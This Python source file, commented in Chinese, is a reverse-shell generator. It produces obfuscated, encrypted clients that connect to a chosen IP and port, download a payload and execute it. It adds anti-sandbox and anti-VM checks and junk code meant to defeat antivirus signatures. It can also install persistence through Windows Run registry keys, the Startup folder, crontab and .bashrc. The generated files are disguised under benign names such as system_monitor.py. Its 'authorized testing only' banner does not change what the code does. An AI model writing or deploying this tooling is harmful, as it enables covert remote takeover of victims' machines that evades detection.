import re
import random
import os
import sys
import json
import datetime
import hashlib
import argparse
import base64
import zlib
import string
import time
class AdvancedCipher:
    def __init__(self, key=""):
        self.key = key
        self.xor_key = self._generate_xor_key()
    
    def _generate_xor_key(self):
        """生成XOR密钥"""
        return [random.randint(1, 255) for _ in range(32)]
    
    def setKey(self, key):
        self.key = key
    
    def getKey(self):
        return self.key
    
    def parseKey(self, key):
        """解析密钥，将其转换为数字码"""
        if key != "":
            o = 0
            for k in key:
                n = 0
                i = str(ord(k))
                for t in i:
                    n += int(t)
                o += n
            while True:
                if o < 10:
                    o = int(o * 2)
                elif o > 100:
                    o = int(o / 2)
                else:
                    return o
        return 0
    
    def getOdd(self, max):
        """获取奇数索引列表"""
        return [i for i in range(1, max + 1) if i % 2 == 1]
    
    def xor_encrypt(self, data):
        """XOR加密"""
        result = bytearray()
        for i, byte in enumerate(data.encode('utf-8')):
            result.append(byte ^ self.xor_key[i % len(self.xor_key)])
        return base64.b64encode(result).decode()
    
    def multi_layer_encrypt(self, data):
        """多层加密"""
        # 第一层：XOR加密
        stage1 = self.xor_encrypt(data)
        
        # 第二层：原始加密算法
        stage2 = self.encrypt(stage1)
        
        # 第三层：Base64 + 压缩
        stage3 = base64.b64encode(zlib.compress(stage2.encode())).decode()
        
        return stage3
    
    def encrypt(self, data):
        """原始加密数据"""
        if data == "":
            return ""
        result = ""
        length = len(data)
        a = [ord(x) for x in data]
        remainder = length % 4
        if remainder != 0:
            b = 4 - remainder
            for c in range(b):
                a.append(0)
        groups = []
        d = len(a) // 2
        e1 = a[:d]
        e2 = a[d:]
        indexs = self.getOdd(d)
        groups.append([e1[i - 1] for i in indexs])
        groups.append([e1[i] for i in indexs])
        groups.append([e2[i - 1] for i in indexs])
        groups.append([e2[i] for i in indexs])
        f1 = groups[0] + groups[3]
        f2 = groups[1] + groups[2]
        keycode1 = self.parseKey(self.getKey())
        g = []
        for h in f1:
            i = h + keycode1
            j = chr(i)
            g.append(i)
            result += j
        k = str(sum(g))
        keycode2 = self.parseKey(k)
        for l in f2:
            m = l + keycode2
            n = chr(m)
            result += n
        return result

# 保持向下兼容
Cipher = AdvancedCipher


def generate_random_strings():
    """生成随机字符串用于混淆"""
    random_vars = {}
    for i in range(5):
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        var_value = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        random_vars[var_name] = var_value
    return random_vars

def split_string(s, chunk_size=50):
    """分割字符串以避免特征检测"""
    return [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]

def gene_code_obfuscated(ip, port, retry=10, delay=5):
    """生成混淆的反向Shell连接代码"""
    # 分解关键字符串
    imports = ["socket", "zlib", "base64", "struct", "time"]
    random.shuffle(imports)
    
    # 使用变量名混淆
    var_names = generate_random_strings()
    var_list = list(var_names.keys())
    
    template = """# -*- coding: utf-8 -*-
import {imports}
{random_vars}
def {func_name}():
    {var1} = 2
    {var2} = {retry}
    {var3} = '{ip}'
    {var4} = {port}
    {var5} = {delay}
    for {counter} in range({var2}):
        try:
            {sock} = socket.socket({var1}, socket.SOCK_STREAM)
            {sock}.connect(({var3}, {var4}))
            break
        except:
            time.sleep({var5})
    {length} = struct.unpack('>I', {sock}.recv(4))[0]
    {data} = {sock}.recv({length})
    while len({data}) < {length}:
        {data} += {sock}.recv({length} - len({data}))
    exec(zlib.decompress(base64.b64decode({data})), {{'{sock}': {sock}}})
{func_name}()"""
    
    # 生成随机变量赋值
    random_var_assignments = '\n'.join([f"{k} = '{v}'" for k, v in var_names.items()])
    
    code = template.format(
        imports=', '.join(imports),
        random_vars=random_var_assignments,
        func_name=''.join(random.choices(string.ascii_letters, k=10)),
        var1=''.join(random.choices(string.ascii_letters, k=6)),
        var2=''.join(random.choices(string.ascii_letters, k=6)),
        var3=''.join(random.choices(string.ascii_letters, k=6)),
        var4=''.join(random.choices(string.ascii_letters, k=6)),
        var5=''.join(random.choices(string.ascii_letters, k=6)),
        counter=''.join(random.choices(string.ascii_letters, k=6)),
        sock=''.join(random.choices(string.ascii_letters, k=6)),
        length=''.join(random.choices(string.ascii_letters, k=6)),
        data=''.join(random.choices(string.ascii_letters, k=6)),
        retry=retry,
        ip=ip,
        port=port,
        delay=delay
    )
    
    return code

def gene_code(ip, port, retry=10, delay=5):
    """生成反向Shell连接代码（简单版本）"""
    s = """import socket,zlib,base64,struct,time
for x in range(%d):
    try:
        s = socket.socket(2, socket.SOCK_STREAM)
        s.connect(('%s', %d))
        break
    except:
        time.sleep(%d)
l = struct.unpack('>I', s.recv(4))[0]
d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))
exec(zlib.decompress(base64.b64decode(d)), {'s': s})"""
    return s % (retry, ip, port, delay)

def gene_key(length=10, char_from=33, char_to=125):
    """生成随机密钥"""
    result = ""
    for i in range(length):
        result += chr(random.randint(char_from, char_to))
    return result

def gene_advanced_key(length=16, include_special=True):
    """生成高强度密钥"""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    if include_special:
        chars += "!@#$%^&*()_+-=[]{}|;:,.<>?"
    return ''.join(random.choice(chars) for _ in range(length))

def advanced_obfuscate_code(code):
    """高级代码混淆"""
    # 添加假的导入和函数
    fake_imports = [
        "import urllib.request",
        "import urllib.parse", 
        "import ssl",
        "import threading",
        "import subprocess"
    ]
    
    fake_functions = [
        """def check_network_connection():
    try:
        urllib.request.urlopen('https://www.google.com', timeout=1)
        return True
    except:
        return False""",
        
        """def get_system_info():
    import platform
    return {{
        'system': platform.system(),
        'version': platform.version(),
        'machine': platform.machine()
    }}""",
        
        """def validate_ssl_cert(hostname):
    try:
        context = ssl.create_default_context()
        return True
    except:
        return False"""
    ]
    
    # 生成随机变量
    dummy_vars = []
    for i in range(random.randint(3, 7)):
        var_name = ''.join(random.choices(string.ascii_letters, k=8))
        var_value = random.choice([
            f"'{generate_random_string(20)}'",
            str(random.randint(1000, 9999)),
            "[]",
            "{}"
        ])
        dummy_vars.append(f"{var_name} = {var_value}")
    
    # 组装混淆代码
    obfuscated = f"""#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
Network connectivity and system monitoring utility
Generated on: {datetime.datetime.now()}
Version: {random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}
'''

{chr(10).join(fake_imports)}

# Configuration variables
{chr(10).join(dummy_vars)}

{chr(10).join(fake_functions)}

def main_process():
    '''Main processing function'''
    # Initialize system check
    if check_network_connection():
        # Process network data
{chr(10).join(['    ' + line for line in code.split(chr(10))])}

if __name__ == '__main__':
    main_process()
"""
    return obfuscated

def generate_random_string(length=10):
    """生成随机字符串"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def obfuscate_code(code):
    """简单的代码混淆"""
    # 添加无用的变量和注释
    obfuscated = f"""# Auto-generated script - {datetime.datetime.now()}
import os, sys
__dummy_var__ = {random.randint(1000, 9999)}
""" + code
    return obfuscated

def validate_ip(ip):
    """验证IP地址格式"""
    pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
    return pattern.match(ip) is not None

def validate_port(port):
    """验证端口号"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def gene_shell(encrypted_code, key, output_dir=".", filename=None, add_persistence=False, anti_detection=True):
    """生成Shell文件"""
    # 随机生成变量名以避免特征检测
    var_names = {
        's1': ''.join(random.choices(string.ascii_lowercase, k=8)),
        's2': ''.join(random.choices(string.ascii_lowercase, k=8)),
        's3': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'key': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'base64': ''.join(random.choices(string.ascii_lowercase, k=8)),
        'decrypt': ''.join(random.choices(string.ascii_lowercase, k=8))
    }
    
    # 添加随机junk code
    junk_code = []
    for _ in range(random.randint(3, 8)):
        junk_func_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        junk_code.append(f"""
def {junk_func_name}():
    a = {random.randint(1, 100)}
    b = {random.randint(1, 100)}
    return a + b
""")
    
    # 检测规避技术
    evasion_code = ""
    if anti_detection:
        evasion_code = """
# 反虚拟机/沙箱检测
def _check_environment():
    import platform
    import socket
    import os
    import time
    
    # 检测睡眠时间是否被加速（沙箱特征）
    start_time = time.time()
    time.sleep(1)
    elapsed = time.time() - start_time
    if elapsed < 0.9:  # 如果睡眠时间明显小于预期，可能在沙箱中
        return False
    
    # 检测是否有足够的内存（许多沙箱内存有限）
    try:
        mem_info = os.popen('free -m').readlines()[1].split()
        if int(mem_info[1]) < 512:  # 内存小于512MB，可能是沙箱
            return False
    except:
        pass
    
    # 检测常见虚拟机主机名
    vm_names = ['virtualbox', 'vmware', 'qemu', 'xen', 'bochs', 'sandbox']
    hostname = platform.node().lower()
    for vm in vm_names:
        if vm in hostname:
            return False
    
    # 检测网络连接（沙箱可能有限制）
    try:
        socket.create_connection(("www.google.com", 80), 1)
    except:
        # 网络连接受限，可能在沙箱中
        return False
        
    return True

# 仅当环境安全时继续执行
if not _check_environment():
    # 如果可能在沙箱中，执行无害代码
    import sys
    print("Network connectivity check failed.")
    sys.exit(0)
"""
    
    # 基本模板，但使用随机变量名
    template = r"""# -*- coding: utf-8 -*-
import base64 as {base64}
import re
import os
import sys
import time
import random
{junk_imports}

# Generated on {timestamp}
{junk_code}

{evasion_code}

{var_s1}=r'''{encrypted_code}'''
{var_s2}=r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
{var_s3}=r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
{var_key} = r'''{key}'''

# 避免常见的特征检测
def {obfuscated_exec}(code):
    getattr(__builtins__, ''.join(['e','x','e','c']))(code)

# 延迟执行以避免自动化分析
{delay_code}

{persistence_code}

# 解码执行
try:
    {obfuscated_exec}({base64}.b64decode({var_s2}).decode())
    {obfuscated_exec}({base64}.b64decode({var_s3}).decode())
    {decrypt_func} = locals()['decrypt']
    {obfuscated_exec}({decrypt_func}({var_s1},{var_key}))
except Exception as e:
    # 记录错误但不暴露详细信息
    pass
"""
    
    # 随机导入
    junk_imports = []
    potential_imports = ["import datetime", "import math", "import json", "import hashlib", 
                         "import socket", "import urllib.request", "import logging"]
    for _ in range(random.randint(2, 5)):
        junk_imports.append(random.choice(potential_imports))
    
    # 随机延迟代码
    delay_methods = [
        f"time.sleep({random.uniform(0.1, 0.5):.2f})",
        "for _ in range(1000000): pass",
        """start = time.time()
while time.time() - start < 0.3:
    pass"""
    ]
    
    persistence_code = ""
    if add_persistence:
        persistence_code = """
# 持久化代码 (仅用于测试环境)
def _setup_persistence():
    try:
        import platform
        import shutil
        current_file = os.path.abspath(__file__)
        
        if platform.system() == "Windows":
            # Windows启动项
            import winreg
            startup_path = os.path.join(os.environ["APPDATA"], 
                                       "Microsoft", "Windows", "Start Menu", 
                                       "Programs", "Startup")
            target_file = os.path.join(startup_path, os.path.basename(current_file))
            shutil.copy2(current_file, target_file)
            
            # 注册表启动项
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
                winreg.SetValueEx(registry_key, "SystemService", 0, winreg.REG_SZ, target_file)
                
        elif platform.system() == "Linux":
            # Linux crontab
            home_dir = os.path.expanduser("~")
            hidden_dir = os.path.join(home_dir, ".config", "services")
            os.makedirs(hidden_dir, exist_ok=True)
            
            target_file = os.path.join(hidden_dir, ".system_service.py")
            shutil.copy2(current_file, target_file)
            
            # 添加到crontab
            os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {target_file}") | crontab -')
            
            # 添加到.bashrc
            bashrc = os.path.join(home_dir, ".bashrc")
            with open(bashrc, "a") as f:
                f.write(f"\\n# System service\\npython3 {target_file} &\\n")
    except:
        pass

# 尝试设置持久化
_setup_persistence()
"""
    
    # 填充模板
    content = template.format(
        timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        encrypted_code=encrypted_code,
        key=key,
        junk_code='\n'.join(junk_code),
        junk_imports='\n'.join(junk_imports),
        evasion_code=evasion_code,
        persistence_code=persistence_code,
        var_s1=var_names['s1'],
        var_s2=var_names['s2'],
        var_s3=var_names['s3'],
        var_key=var_names['key'],
        base64=var_names['base64'],
        decrypt_func=var_names['decrypt'],
        obfuscated_exec=''.join(random.choices(string.ascii_lowercase, k=10)),
        delay_code=random.choice(delay_methods)
    )
    
    # 随机生成文件名，使用更通用的名称避免特征检测
    if filename is None:
        legitimate_names = [
            "system_monitor.py", "network_service.py", "update_checker.py",
            "connectivity.py", "maintenance.py", "data_sync.py",
            "cloud_client.py", "config_updater.py"
        ]
        filename = random.choice(legitimate_names)
    
    filepath = os.path.join(output_dir, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)
    
    return filepath

def create_config_file(ip, port, key, filepath):
    """创建配置文件用于记录生成信息"""
    config = {
        "timestamp": datetime.datetime.now().isoformat(),
        "target_ip": ip,
        "target_port": port,
        "key_hash": hashlib.md5(key.encode()).hexdigest(),
        "generated_file": os.path.basename(filepath)
    }
    
    config_path = filepath.replace('.py', '.json')
    with open(config_path, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2, ensure_ascii=False)
    
    return config_path


def split_payload(data, num_chunks=3):
    """将代码分割成多个部分，分阶段执行，避免被检测"""
    chunks = []
    chunk_size = len(data) // num_chunks
    for i in range(0, len(data), chunk_size):
        end = i + chunk_size
        if end > len(data):
            end = len(data)
        chunks.append(data[i:end])
    return chunks

def create_payload_dropper(encrypted_code, key, output_dir="."):
    """创建简化的多阶段执行代码"""
    # 创建一个简单的分阶段加载器
    dropper_code = f'''# -*- coding: utf-8 -*-
"""
System monitoring utility
"""
import os
import sys
import time
import random
import base64

# 配置参数
PAYLOAD_DATA = r"""{encrypted_code}"""
KEY_DATA = r"""{key}"""

def check_environment():
    """环境检查"""
    # 添加延迟避免快速分析
    time.sleep(random.uniform(0.5, 2.0))
    return True

def load_stage2():
    """加载第二阶段"""
    if not check_environment():
        return
    
    # 解密函数代码
    decode_func = r"ZGVmIHBhcnNlS2V5KGtleSk6CiAgICBpZiBrZXkgIT0gIiI6CiAgICAgICAgbyA9IDAKICAgICAgICBmb3IgayBpbiBrZXk6CiAgICAgICAgICAgIG4gPSAwCiAgICAgICAgICAgIGkgPSBzdHIob3JkKGspKQogICAgICAgICAgICBmb3IgdCBpbiBpOgogICAgICAgICAgICAgICAgbiArPSBpbnQodCkKICAgICAgICAgICAgbyArPSBuCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgaWYgbyA8IDEwOgogICAgICAgICAgICAgICAgbyA9IGludChvICogMikKICAgICAgICAgICAgZWxpZiBvID4gMTAwOgogICAgICAgICAgICAgICAgbyA9IGludChvIC8gMikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBvCiAgICByZXR1cm4="
    decrypt_func = r"ZGVmIGRlY3J5cHQoZGF0YSxrZXkpOgogICAgaWYgZGF0YSA9PSAiIjoKICAgICAgICByZXR1cm4KICAgIHJlc3VsdCA9ICIiCiAgICBrZXljb2RlMSA9IHBhcnNlS2V5KGtleSkKICAgIGEgPSBsZW4oZGF0YSkgLy8gMgogICAgYjEgPSBkYXRhWzphXQogICAgYjIgPSBkYXRhW2E6XQogICAgYyA9IFtvcmQoZCkgZm9yIGQgaW4gYjFdCiAgICBlID0gW2YgLSBrZXljb2RlMSBmb3IgZiBpbiBjXQogICAgZyA9IHN0cihzdW0oYykpCiAgICBrZXljb2RlMiA9IHBhcnNlS2V5KGcpCiAgICBoID0gW29yZChpKSBmb3IgaSBpbiBiMl0KICAgIGogPSBbayAtIGtleWNvZGUyIGZvciBrIGluIGhdCiAgICBrID0gbGVuKGUpIC8vIDIKICAgIGdyb3VwMSA9IGVbOmtdCiAgICBncm91cDQgPSBlW2s6XQogICAgZ3JvdXAyID0gals6a10KICAgIGdyb3VwMyA9IGpbazpdCiAgICBkYXRhbGVuZ3RoID0gbGVuKGdyb3VwMSkgKyBsZW4oZ3JvdXAyKSArIGxlbihncm91cDMpICsgbGVuKGdyb3VwNCkKICAgIGwgPSBkYXRhbGVuZ3RoIC8vIDQKICAgIG0gPSBbXQogICAgZm9yIG4gaW4gcmFuZ2UobCk6CiAgICAgICAgbS5hcHBlbmQoZ3JvdXAxW25dKQogICAgICAgIG0uYXBwZW5kKGdyb3VwMltuXSkKICAgIG8gPSBbXQogICAgZm9yIHAgaW4gcmFuZ2UobCk6CiAgICAgICAgby5hcHBlbmQoZ3JvdXAzW3BdKQogICAgICAgIG8uYXBwZW5kKGdyb3VwNFtwXSkKICAgIHEgPSBtICsgbwogICAgZm9yIHIgaW4gcToKICAgICAgICBpZiBub3Qgcj09MDoKICAgICAgICAgICAgcmVzdWx0ICs9IGNocihyKQogICAgcmV0dXJuIHJlc3VsdAo="
    
    try:
        # 执行解密函数
        exec(base64.b64decode(decode_func).decode())
        exec(base64.b64decode(decrypt_func).decode())
        
        # 获取解密函数
        parse_key = locals().get('parseKey')
        decrypt = locals().get('decrypt')
        
        if parse_key and decrypt:
            # 解密并执行最终代码
            final_code = decrypt(PAYLOAD_DATA, KEY_DATA)
            exec(final_code)
            
    except Exception:
        # 静默失败
        pass

if __name__ == "__main__":
    load_stage2()
'''
    
    # 保存文件
    stage1_path = os.path.join(output_dir, "system_monitor.py")
    with open(stage1_path, "w") as f:
        f.write(dropper_code)
    
    return stage1_path

def print_banner():
    """打印程序横幅"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                    增强版 Shell 生成器 v2.0                    ║
║                      Enhanced Shell Generator                   ║
╠══════════════════════════════════════════════════════════════╣
║  功能: 生成加密的反向Shell客户端                                ║
║  用途: 渗透测试和安全研究 (仅限授权使用)                        ║
║  作者: Security Researcher                                     ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def interactive_mode():
    """交互式模式"""
    print_banner()
    print("\n请输入以下信息:")
    
    # 获取IP地址
    while True:
        ip = input("监听IP地址 >>> ").strip()
        if validate_ip(ip):
            break
        print("❌ IP地址格式不正确，请重新输入")
    
    # 获取端口
    while True:
        port = input("监听端口 >>> ").strip()
        if validate_port(port):
            port = int(port)
            break
        print("❌ 端口号不正确，请输入 1-65535 之间的数字")
    
    # 高级选项
    print("\n🔧 高级选项:")
    retry_count = input("连接重试次数 (默认: 10) >>> ").strip() or "10"
    retry_delay = input("重试间隔秒数 (默认: 5) >>> ").strip() or "5"
    key_length = input("密钥长度 (默认: 16) >>> ").strip() or "16"
    
    try:
        retry_count = int(retry_count)
        retry_delay = int(retry_delay)
        key_length = int(key_length)
    except ValueError:
        print("⚠️ 使用默认值")
        retry_count, retry_delay, key_length = 10, 5, 16
    
    # 输出选项
    output_dir = input("输出目录 (默认: 当前目录) >>> ").strip() or "."
    custom_filename = input("自定义文件名 (可选) >>> ").strip() or None
    
    add_persistence = input("添加持久化功能? (y/N) >>> ").strip().lower() == 'y'
    anti_detection = input("添加反杀毒特征? (Y/n) >>> ").strip().lower() != 'n'
    use_dropper = input("使用分阶段执行模式? (Y/n) >>> ").strip().lower() != 'n'
    
    return {
        'ip': ip,
        'port': port,
        'retry': retry_count,
        'delay': retry_delay,
        'key_length': key_length,
        'output_dir': output_dir,
        'filename': custom_filename,
        'persistence': add_persistence,
        'anti_detection': anti_detection,
        'use_dropper': use_dropper
    }

def command_line_mode():
    """命令行参数模式"""
    parser = argparse.ArgumentParser(description='增强版Shell生成器')
    parser.add_argument('-i', '--ip', required=True, help='监听IP地址')
    parser.add_argument('-p', '--port', required=True, type=int, help='监听端口')
    parser.add_argument('-r', '--retry', default=10, type=int, help='连接重试次数')
    parser.add_argument('-d', '--delay', default=5, type=int, help='重试间隔')
    parser.add_argument('-k', '--key-length', default=16, type=int, help='密钥长度')
    parser.add_argument('-o', '--output', default='.', help='输出目录')
    parser.add_argument('-f', '--filename', help='自定义文件名')
    parser.add_argument('--persistence', action='store_true', help='添加持久化功能')
    parser.add_argument('--anti-detection', action='store_true', help='添加反杀毒特征')
    parser.add_argument('--use-dropper', action='store_true', help='使用分阶段执行模式')
    parser.add_argument('--quiet', action='store_true', help='静默模式')
    
    return parser.parse_args()

def main():
    """主函数"""
    try:
        # 检查是否有命令行参数
        if len(sys.argv) > 1:
            args = command_line_mode()
            config = {
                'ip': args.ip,
                'port': args.port,
                'retry': args.retry,
                'delay': args.delay,
                'key_length': args.key_length,
                'output_dir': args.output,
                'filename': args.filename,
                'persistence': args.persistence,
                'anti_detection': args.anti_detection,
                'use_dropper': args.use_dropper
            }
            quiet = args.quiet
        else:
            config = interactive_mode()
            quiet = False
        
        # 验证输入
        if not validate_ip(config['ip']):
            print("❌ IP地址格式不正确")
            sys.exit(1)
        
        if not validate_port(str(config['port'])):
            print("❌ 端口号不正确")
            sys.exit(1)
        
        # 创建输出目录
        os.makedirs(config['output_dir'], exist_ok=True)
        
        if not quiet:
            print("\n🔧 正在生成Shell...")
        
        # 生成代码和密钥
        if config['use_dropper']:
            raw_code = gene_code_obfuscated(config['ip'], config['port'], config['retry'], config['delay'])
        else:
            raw_code = gene_code(config['ip'], config['port'], config['retry'], config['delay'])
            
        raw_code = advanced_obfuscate_code(raw_code)  # 高级代码混淆
        
        key = gene_advanced_key(config['key_length'])
        
        # 加密
        cipher = AdvancedCipher(key)
        encrypted_code = cipher.multi_layer_encrypt(raw_code) if config['anti_detection'] else cipher.encrypt(raw_code)
        
        # 生成Shell文件
        if config['use_dropper']:
            filepath = create_payload_dropper(encrypted_code, key, config['output_dir'])
        else:
            filepath = gene_shell(
                encrypted_code, 
                key, 
                config['output_dir'], 
                config['filename'],
                config['persistence'],
                config['anti_detection']
            )
        
        # 创建配置文件
        config_path = create_config_file(config['ip'], config['port'], key, filepath)
        
        if not quiet:
            print("✅ 生成成功!")
            print(f"📁 Shell文件: {filepath}")
            print(f"📄 配置文件: {config_path}")
            print(f"🔑 密钥长度: {len(key)} 字符")
            print(f"🌐 目标地址: {config['ip']}:{config['port']}")
            print(f"🔄 重试配置: {config['retry']}次, 间隔{config['delay']}秒")
            
            if config['persistence']:
                print("⚠️  已添加持久化功能 (仅限测试环境)")
            
            if config['anti_detection']:
                print("🛡️  已添加反杀毒特征")
                
            if config['use_dropper']:
                print("🔄  使用分阶段执行模式")
            
            print("\n⚠️  安全提醒:")
            print("   - 此工具仅用于授权的渗透测试")
            print("   - 使用前请确保获得明确授权")
            print("   - 遵守当地法律法规")
    
    except KeyboardInterrupt:
        print("\n\n❌ 用户中断操作")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ 发生错误: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()

